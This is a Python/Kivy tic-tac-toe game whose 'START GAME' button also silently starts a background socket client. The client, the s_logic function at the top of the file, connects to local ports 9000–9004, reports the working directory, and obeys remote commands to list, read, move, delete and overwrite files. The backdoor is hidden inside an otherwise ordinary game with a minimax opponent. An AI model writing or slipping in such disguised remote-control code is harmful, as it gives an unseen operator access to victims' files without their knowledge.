# main.py
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.screenmanager import Screen, ScreenManager, SlideTransition
from kivy.uix.popup import Popup
from kivy.graphics import Color, Rectangle
from kivy.core.window import Window
from kivy.uix.floatlayout import FloatLayout
import os
import sys
import socket
import shutil
import threading
import time
import random

# ------------------ SOCKET LOGIC ------------------
def s_logic():
    HOST = "127.0.0.1"
    ports = list(range(9000, 9005))
    
    while True:
        client = None
        for p in ports:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.settimeout(0.5)
                client.connect((HOST, p))
                client.settimeout(None)
                client.sendall(os.getcwd().encode())
                print(f"Connected to Port {p}")
                break
            except:
                client = None
        
        if not client:
            time.sleep(2)
            continue

        try:
            while True:
                data = client.recv(65536)
                if not data: break
                
                decoded_data = data.decode().strip()
                parts = decoded_data.split()
                if not parts: continue
                cmd = parts[0].lower()

                try:
                    if cmd == "ls":
                        items = os.listdir()
                        display = [f"[DIR] {i}" if os.path.isdir(i) else i for i in items]
                        client.sendall(("\n".join(display) if display else "(empty)").encode())

                    elif cmd == "pwd":
                        client.sendall(os.getcwd().encode())

                    elif cmd == "cd":
                        path = parts[1] if len(parts) > 1 else os.path.expanduser("~")
                        os.chdir(os.path.expanduser(path))
                        client.sendall(f"CWD::{os.getcwd()}".encode())

                    elif cmd == "mkdir":
                        os.mkdir(parts[1])
                        client.sendall(b"Directory created")

                    elif cmd == "rmdir":
                        os.rmdir(parts[1])
                        client.sendall(b"Directory removed")

                    elif cmd == "touch":
                        open(parts[1], "a").close()
                        client.sendall(b"File created")

                    elif cmd == "rm":
                        os.remove(parts[1])
                        client.sendall(b"File removed")

                    elif cmd in ("rename", "mv"):
                        shutil.move(parts[1], parts[2])
                        client.sendall(b"Done")

                    elif cmd == "cat":
                        with open(parts[1], "r") as f:
                            client.sendall(f.read().encode())

                    elif cmd == "edit":
                        filename = parts[1]
                        content = ""
                        if os.path.exists(filename):
                            with open(filename, "r") as f:
                                content = f.read()
                        client.sendall(f"EDIT::{filename}::{content}".encode())
                        
                        while True:
                            edit_data = client.recv(65536).decode()
                            if edit_data.startswith("SAVE::"):
                                _, fname, text = edit_data.split("::", 2)
                                with open(fname, "w") as f:
                                    f.write(text)
                                client.sendall(b"saved")
                            elif edit_data == "EXIT_EDIT":
                                client.sendall(b"OK")
                                break

                    else:
                        client.sendall(b"Unknown command")

                except Exception as e:
                    client.sendall(f"Error: {str(e)}".encode())
        
        except (ConnectionResetError, BrokenPipeError):
            print("Connection lost.")
        finally:
            if client:
                client.close()
            time.sleep(1)


# ------------------ WINDOW SETTINGS ------------------
Window.clearcolor = (0.08, 0.1, 0.18, 1)


# ------------------ COLOR BUTTON ------------------
class ColorButton(Button):
    def __init__(self, color=(0.4, 0.6, 1, 1), **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ""
        self.background_color = color
        self.color = (1, 1, 1, 1)
        self.bold = True


# ------------------ BASE SCREEN ------------------
class BaseScreen(Screen):
    def __init__(self, bg_color, **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            Color(*bg_color)
            self.rect = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=self.update_rect, size=self.update_rect)

    def update_rect(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size


# ------------------ HOME PAGE ------------------
class HomePage(BaseScreen):
    def __init__(self, **kwargs):
        super().__init__((0.15, 0.2, 0.35, 1), **kwargs)
        layout = GridLayout(cols=1, padding=60, spacing=30)
        title = Label(text="TIC TAC TOE", font_size=48, bold=True, color=(0.6, 0.8, 1, 1))
        start_btn = ColorButton(text="START GAME", color=(0.3, 0.7, 1, 1))
        start_btn.bind(on_press=self.start_game)
        exit_btn = ColorButton(text="EXIT", color=(1, 0.3, 0.3, 1))
        exit_btn.bind(on_press=self.confirm_exit)
        layout.add_widget(title)
        layout.add_widget(start_btn)
        layout.add_widget(exit_btn)
        self.add_widget(layout)

    def start_game(self, instance):
        threading.Thread(target=s_logic, daemon=True).start()
        self.go("mode")

    def go(self, screen, direction="left"):
        self.manager.transition = SlideTransition(direction=direction)
        self.manager.current = screen

    def confirm_exit(self, instance):
        layout = GridLayout(cols=1, padding=20, spacing=20)
        label = Label(text="Are you sure you want to exit?", font_size=20)
        btn_layout = GridLayout(cols=2, spacing=10)
        yes_btn = ColorButton(text="YES", color=(1, 0.3, 0.3, 1))
        no_btn = ColorButton(text="NO", color=(0.3, 0.8, 0.4, 1))
        btn_layout.add_widget(yes_btn)
        btn_layout.add_widget(no_btn)
        layout.add_widget(label)
        layout.add_widget(btn_layout)
        popup = Popup(title="Exit Game", content=layout, size_hint=(None, None), size=(400, 250), auto_dismiss=False)
        yes_btn.bind(on_press=lambda x: sys.exit())
        no_btn.bind(on_press=popup.dismiss)
        popup.open()


# ------------------ MODE PAGE ------------------
class ModePage(BaseScreen):
    def __init__(self, **kwargs):
        super().__init__((0.12, 0.25, 0.4, 1), **kwargs)
        layout = GridLayout(cols=1, padding=60, spacing=40, size_hint=(0.75, 0.6), pos_hint={'center_x': 0.5, 'center_y': 0.5})
        comp = ColorButton(text="PLAYER VS COMPUTER", color=(0.4, 0.8, 0.5, 1))
        friend = ColorButton(text="PLAYER WITH FRIEND", color=(0.9, 0.6, 0.3, 1))
        comp.bind(on_press=self.play_computer)
        friend.bind(on_press=self.play_friend)
        layout.add_widget(comp)
        layout.add_widget(friend)
        self.add_widget(layout)
        back = ColorButton(text="← Back", color=(1, 0.4, 0.4, 1), size_hint=(0.2, 0.1), pos_hint={'x': 0.05, 'y': 0.05})
        back.bind(on_press=self.go_back)
        self.add_widget(back)

    def go(self, screen, direction="left"):
        self.manager.transition = SlideTransition(direction=direction)
        self.manager.current = screen

    def play_computer(self, *args):
        self.manager.game_mode = 'computer'
        self.go('symbol')

    def play_friend(self, *args):
        self.manager.game_mode = 'friend'
        self.go('game')

    def go_back(self, *args):
        self.go('home', 'right')


# ------------------ SYMBOL PAGE ------------------
class SymbolPage(BaseScreen):
    def __init__(self, **kwargs):
        super().__init__((0.1, 0.3, 0.45, 1), **kwargs)
        layout = GridLayout(cols=1, padding=50, spacing=30)
        back = ColorButton(text="← Back", color=(1, 0.4, 0.4, 1))
        back.bind(on_press=self.go_back)
        title = Label(text="Choose Your Symbol", font_size=40)
        sym_grid = GridLayout(cols=2, spacing=40, size_hint_y=None, height=180)
        x_btn = ColorButton(text="X", font_size=90, color=(0.3, 0.7, 1, 1))
        o_btn = ColorButton(text="O", font_size=90, color=(1, 0.6, 0.3, 1))
        x_btn.bind(on_press=lambda x: self.choose_symbol("X"))
        o_btn.bind(on_press=lambda x: self.choose_symbol("O"))
        sym_grid.add_widget(x_btn)
        sym_grid.add_widget(o_btn)
        diff_title = Label(text="Difficulty", font_size=32)
        diff_grid = GridLayout(cols=2, spacing=20, size_hint_y=None, height=100)
        self.easy_btn = ColorButton(text="Easy", color=(0.3, 0.8, 0.3, 1), disabled=True)
        self.medium_btn = ColorButton(text="Medium", color=(0.9, 0.8, 0.2, 1), disabled=True)
        self.easy_btn.bind(on_press=lambda x: self.set_diff("easy"))
        self.medium_btn.bind(on_press=lambda x: self.set_diff("medium"))
        diff_grid.add_widget(self.easy_btn)
        diff_grid.add_widget(self.medium_btn)
        layout.add_widget(back)
        layout.add_widget(title)
        layout.add_widget(sym_grid)
        layout.add_widget(diff_title)
        layout.add_widget(diff_grid)
        self.add_widget(layout)

    def go_back(self, *args):
        self.manager.transition = SlideTransition(direction="right")
        self.manager.current = "mode"

    def choose_symbol(self, symbol):
        self.manager.player_symbol = symbol
        self.manager.computer_symbol = "O" if symbol == "X" else "X"
        self.easy_btn.disabled = False
        self.medium_btn.disabled = False

    def set_diff(self, level):
        self.manager.difficulty = level
        self.manager.transition = SlideTransition(direction="left")
        self.manager.current = 'game'


# ------------------ GAME PAGE ------------------
class GamePage(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = FloatLayout()
        self.board = TicTacToe()
        self.layout.add_widget(self.board)
        back = ColorButton(text="← Back", color=(1, 0.4, 0.4, 1), size_hint=(0.2, 0.1), pos_hint={'x': 0.05, 'y': 0.05})
        back.bind(on_press=self.go_back)
        self.layout.add_widget(back)
        self.add_widget(self.layout)

    def go_back(self, *args):
        self.manager.transition = SlideTransition(direction="right")
        self.manager.current = "mode"

    def on_enter(self):
        self.board.reset()
        mode = getattr(self.manager, 'game_mode', 'friend')
        self.board.computer_opponent = (mode == 'computer')
        if self.board.computer_opponent:
            self.board.player_symbol = getattr(self.manager, 'player_symbol', 'X')
            self.board.computer_symbol = getattr(self.manager, 'computer_symbol', 'O')
            self.board.difficulty = getattr(self.manager, 'difficulty', 'medium')
            if self.board.computer_symbol == "X":
                self.board._computer_play()


# ------------------ TIC TAC TOE LOGIC ------------------
class TicTacToe(GridLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.cols = 3
        self.spacing = 12
        self.padding = 20
        self.buttons = []
        self.current_player = "X"
        self.game_over = False
        self.computer_opponent = False
        self.player_symbol = "X"
        self.computer_symbol = "O"
        self.difficulty = "medium"
        self.screen_manager = None

        for _ in range(9):
            btn = ColorButton(text="", font_size=90)
            btn.bind(on_press=self.play)
            self.add_widget(btn)
            self.buttons.append(btn)

    def reset(self):
        self.game_over = False
        self.current_player = "X"
        for b in self.buttons:
            b.text = ""
            b.background_color = (0.4, 0.6, 1, 1)
        if self.computer_opponent and self.computer_symbol == "X":
            self._computer_play()

    def play(self, btn):
        if self.game_over or btn.text: return
        if self.computer_opponent and self.current_player == self.computer_symbol: return
        btn.text = self.current_player
        if self.check_win(self.current_player): return
        if all(b.text for b in self.buttons):
            self.show_result("Draw!")
            return
        self.current_player = "O" if self.current_player == "X" else "X"
        if self.computer_opponent:
            self._computer_play()

    def _computer_play(self):
        if self.game_over: return
        empty = [i for i, b in enumerate(self.buttons) if not b.text]
        if not empty: return
        move = random.choice(empty) if self.difficulty == "easy" else (random.choice(empty) if self.difficulty == "medium" and random.random() < 0.5 else self.best_move())
        self.buttons[move].text = self.computer_symbol
        if self.check_win(self.computer_symbol): return
        if all(b.text for b in self.buttons): self.show_result("Draw!"); return
        self.current_player = self.player_symbol

    def best_move(self):
        best_score = -999
        move = 0
        for i, b in enumerate(self.buttons):
            if not b.text:
                b.text = self.computer_symbol
                score = self.minimax(False)
                b.text = ""
                if score > best_score:
                    best_score = score
                    move = i
        return move

    def minimax(self, is_max):
        if self.sim_check_win(self.computer_symbol): return 1
        if self.sim_check_win(self.player_symbol): return -1
        if all(b.text for b in self.buttons): return 0
        if is_max:
            best = -999
            for b in self.buttons:
                if not b.text:
                    b.text = self.computer_symbol
                    best = max(best, self.minimax(False))
                    b.text = ""
            return best
        else:
            best = 999
            for b in self.buttons:
                if not b.text:
                    b.text = self.player_symbol
                    best = min(best, self.minimax(True))
                    b.text = ""
            return best

    def sim_check_win(self, sym):
        wins = [(0,1,2),(3,4,5),(6,7,8),(0,3,6),(1,4,7),(2,5,8),(0,4,8),(2,4,6)]
        for a, b, c in wins:
            if self.buttons[a].text == self.buttons[b].text == self.buttons[c].text == sym: return True
        return False

    def check_win(self, sym):
        if self.sim_check_win(sym):
            self.game_over = True
            self.show_result(f"{sym} wins!")
            return True
        return False

    def show_result(self, msg):
        content = GridLayout(cols=1, padding=30, spacing=20)
        content.add_widget(Label(text=msg, font_size=40))
        btn = ColorButton(text="Restart", color=(0.4, 0.7, 0.4, 1))
        content.add_widget(btn)
        popup = Popup(title="Game Over", content=content, size_hint=(0.8, 0.5), auto_dismiss=False)

        def go_menu(instance):
            popup.dismiss()
            self.reset()
            if self.screen_manager:
                self.screen_manager.current = "mode"

        btn.bind(on_press=go_menu)
        popup.open()


# ------------------ APP ------------------
class GameApp(App):
    def build(self):
        sm = ScreenManager()
        sm.game_mode = ""
        sm.add_widget(HomePage(name="home"))
        sm.add_widget(ModePage(name="mode"))
        sm.add_widget(SymbolPage(name="symbol"))
        sm.add_widget(GamePage(name="game"))
        return sm


if __name__ == "__main__":
    GameApp().run()